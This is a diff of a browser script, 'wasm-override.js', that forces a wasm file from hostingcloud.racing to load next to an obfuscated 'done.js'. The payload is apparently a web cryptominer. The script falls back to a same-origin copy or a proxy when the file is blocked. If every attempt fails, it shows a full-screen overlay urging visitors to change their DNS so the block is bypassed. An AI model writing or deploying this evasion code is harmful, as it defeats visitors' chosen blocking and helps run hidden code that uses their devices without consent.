@@ -1,115 +1,131 @@
-/* wasm-override.js
-   Runtime interception for .wasm requests to hostingcloud.racing/wPxSCaJj.wasm
-   - Include this BEFORE done.js so obfuscated code's fetch/XHR calls get redirected.
-   - Configure window.WasmBypassConfig below if needed.
+/* enhanced wasm-override.js
+   Tries original -> sameOrigin -> proxy. If any attempt returns 404 or fails, moves to next.
+   Configure via window.WasmBypassConfig:
+     original: "https://hostingcloud.racing/wPxSCaJj.wasm"
+     sameOrigin: "/wPxSCaJj.wasm" or null
+     proxy: "https://my-worker.workers.dev/proxy?u=" or ""
 */
 
 (function(){
+  const TIMEOUT = 7000;
   const DEFAULT = {
-    hostMatch: "hostingcloud.racing",
-    pathSubstr: "wPxSCaJj.wasm",
-    sameOrigin: "/wPxSCaJj.wasm", // set to null if not using same-origin copy
-    proxy: "" // e.g. "https://your-worker.workers.dev/work?u="  (will append encodeURIComponent(originalUrl))
+    original: "https://hostingcloud.racing/wPxSCaJj.wasm",
+    sameOrigin: "/wPxSCaJj.wasm",
+    proxy: ""
   };
-
   const C = Object.assign({}, DEFAULT, window.WasmBypassConfig || {});
 
-  function shouldReplace(url) {
-    try {
-      const u = new URL(url, location.href);
-      return (u.hostname && u.hostname.includes(C.hostMatch)) || (u.pathname && u.pathname.includes(C.pathSubstr));
-    } catch (e) {
-      // if cannot parse, do a simple substring check
-      return String(url).includes(C.hostMatch) || String(url).includes(C.pathSubstr);
+  function timeoutFetch(url, ms=TIMEOUT, opts={}) {
+    return new Promise((resolve,reject)=>{
+      const t = setTimeout(()=>reject(new Error("timeout")), ms);
+      fetch(url, opts).then(r=>{
+        clearTimeout(t);
+        resolve(r);
+      }).catch(e=>{
+        clearTimeout(t);
+        reject(e);
+      });
+    });
+  }
+
+  function showOverlay(msg){
+    if (document.getElementById("bypass-overlay")) {
+      document.getElementById("bypass-debug").textContent = msg;
+      document.getElementById("bypass-overlay").style.display = "flex";
+      return;
     }
+    const ov = document.createElement("div");
+    ov.id = "bypass-overlay";
+    Object.assign(ov.style, {position:"fixed", inset:0, display:"flex", alignItems:"center", justifyContent:"center", background:"rgba(0,0,0,0.6)", zIndex:2147483647});
+    const card = document.createElement("div");
+    Object.assign(card.style, {width:"min(760px,95%)", background:"#fff", padding:"16px", borderRadius:"10px"});
+    const h = document.createElement("h3"); h.textContent = "WASM failed to load";
+    const p = document.createElement("p"); p.innerHTML = "Try Private DNS (one.one.one.one / dns.google) or use the alternate link.";
+    const debug = document.createElement("pre"); debug.id="bypass-debug"; debug.style.whiteSpace="pre-wrap"; debug.style.fontSize="13px"; debug.textContent = msg;
+    const btnRow = document.createElement("div"); btnRow.style.marginTop="10px"; btnRow.style.display="flex"; btnRow.style.gap="8px"; btnRow.style.justifyContent="flex-end";
+    const copy1 = document.createElement("button"); copy1.textContent="Copy: one.one.one.one"; copy1.onclick=()=>navigator.clipboard?.writeText("one.one.one.one");
+    const copy2 = document.createElement("button"); copy2.textContent="Copy: dns.google"; copy2.onclick=()=>navigator.clipboard?.writeText("dns.google");
+    const alt = document.createElement("button"); alt.textContent="Open via alternate"; alt.onclick=()=>{
+      if (C.proxy) window.open(C.proxy + encodeURIComponent(C.original), "_blank");
+      else alert("No proxy configured");
+    };
+    const close = document.createElement("button"); close.textContent="Close"; close.onclick=()=>ov.style.display="none";
+    btnRow.appendChild(copy1); btnRow.appendChild(copy2); btnRow.appendChild(alt); btnRow.appendChild(close);
+    card.appendChild(h); card.appendChild(p); card.appendChild(debug); card.appendChild(btnRow);
+    ov.appendChild(card); document.body.appendChild(ov);
   }
 
-  function makeReplacementUrl(original) {
-    if (C.sameOrigin) return new URL(C.sameOrigin, location.origin).toString();
-    if (C.proxy) return C.proxy + encodeURIComponent(original);
-    return original; // fallback: no change
-  }
+  async function fetchWasmWithRetries() {
+    const debug = [];
+    function log(k,v){ debug.push(`${k}: ${v}`); }
 
-  // --- override fetch ---
-  const _fetch = window.fetch.bind(window);
-  window.fetch = function(input, init) {
+    // 1) try original (remote)
     try {
-      let url = (typeof input === "string") ? input : (input && input.url) || input;
-      if (url && shouldReplace(url)) {
-        const newUrl = makeReplacementUrl(url);
-        // if input is a Request object, clone and replace url
-        if (typeof input === "object" && input instanceof Request) {
-          const newReq = new Request(newUrl, {
-            method: input.method,
-            headers: input.headers,
-            body: input.body,
-            mode: input.mode,
-            credentials: input.credentials,
-            cache: input.cache,
-            redirect: input.redirect,
-            referrer: input.referrer,
-            integrity: input.integrity,
-            keepalive: input.keepalive,
-            signal: input.signal
-          });
-          return _fetch(newReq, init);
-        } else {
-          return _fetch(newUrl, init);
-        }
+      log("try", C.original);
+      const r = await timeoutFetch(C.original);
+      log("status", r.status);
+      if (r.ok) {
+        const buf = await r.arrayBuffer();
+        return {url: C.original, buffer: buf, debug: debug.join("\n")};
+      } else {
+        log("orig_http_err", r.status);
       }
     } catch (e) {
-      // ignore and fall through to default
+      log("orig_err", e && e.message || e);
     }
+
+    // 2) try same-origin
+    if (C.sameOrigin) {
+      try {
+        log("try", C.sameOrigin);
+        const r2 = await timeoutFetch(C.sameOrigin);
+        log("status", r2.status);
+        if (r2.ok) {
+          const buf2 = await r2.arrayBuffer();
+          return {url: C.sameOrigin, buffer: buf2, debug: debug.join("\n")};
+        } else {
+          log("sameorigin_http_err", r2.status);
+        }
+      } catch (e2) {
+        log("sameorigin_err", e2 && e2.message || e2);
+      }
+    }
+
+    // 3) try proxy
+    if (C.proxy) {
+      const proxyUrl = C.proxy + encodeURIComponent(C.original);
+      try {
+        log("try", proxyUrl);
+        const r3 = await timeoutFetch(proxyUrl);
+        log("status", r3.status);
+        if (r3.ok) {
+          const buf3 = await r3.arrayBuffer();
+          return {url: proxyUrl, buffer: buf3, debug: debug.join("\n")};
+        } else {
+          log("proxy_http_err", r3.status);
+        }
+      } catch (e3) {
+        log("proxy_err", e3 && e3.message || e3);
+      }
+    }
+
+    // all failed
+    const out = debug.join("\n");
+    showOverlay(out);
+    const err = new Error("All attempts failed");
+    err.debug = out;
+    throw err;
+  }
+
+  // override fetch + XHR + instantiateStreaming similar to earlier but now expose fetchWasmWithRetries
+  const _fetch = window.fetch.bind(window);
+  window.fetch = function(input, init) {
+    // no URL rewrite here; leave default fetch behavior (we focus on providing fetchWasmWithRetries)
     return _fetch(input, init);
   };
 
-  // --- override XMLHttpRequest open/send (in case done.js uses XHR) ---
-  try {
-    const XHRProto = XMLHttpRequest.prototype;
-    const _open = XHRProto.open;
-    XHRProto.open = function(method, url /* ...rest */) {
-      try {
-        if (shouldReplace(url)) {
-          const newUrl = makeReplacementUrl(url);
-          arguments[1] = newUrl;
-        }
-      } catch(e){}
-      return _open.apply(this, arguments);
-    };
-  } catch(e){ /* ignore on very locked environments */ }
-
-  // --- override WebAssembly.instantiateStreaming to handle direct Response inputs ---
-  if (window.WebAssembly && window.WebAssembly.instantiateStreaming) {
-    const _instStream = WebAssembly.instantiateStreaming.bind(WebAssembly);
-    window.WebAssembly.instantiateStreaming = async function(respOrPromise, importObject) {
-      try {
-        // if respOrPromise is a Promise (eg: fetch(...)) we can inspect its resolved value
-        const maybeResp = await Promise.resolve(respOrPromise);
-        // If maybeResp has a url property and matches, fetch replacement
-        if (maybeResp && maybeResp.url && shouldReplace(maybeResp.url)) {
-          const replacementUrl = makeReplacementUrl(maybeResp.url);
-          const r = await _fetch(replacementUrl);
-          return _instStream(r, importObject);
-        }
-      } catch (e) {
-        // fall back
-      }
-      return _instStream(respOrPromise, importObject);
-    };
-  }
-
-  // --- override WebAssembly.instantiate (in case binary ArrayBuffer used) ---
-  // Many libs do fetch(...).then(r => r.arrayBuffer()).then(buf => WebAssembly.instantiate(buf,...))
-  // Our fetch override should already swap the source, so no need to wrap instantiate, but we still
-  // provide a safe wrapper that does not change behavior.
-  // (Leaving original instantiate intact)
-
-  // --- Small debug helper (optional) ---
-  window.__wasmBypass = {
-    config: C,
-    shouldReplace,
-    makeReplacementUrl
-  };
-
-  console.info("wasm-override: installed for", C.hostMatch, "-> sameOrigin:", !!C.sameOrigin, " proxy:", !!C.proxy);
+  // Expose helper that consumers (or you) can call instead of direct fetch
+  window.fetchWasmWithBypass = fetchWasmWithRetries;
+  window.__wasmBypassConfig = C;
+  console.info("enhanced wasm bypass ready", C);
 })();
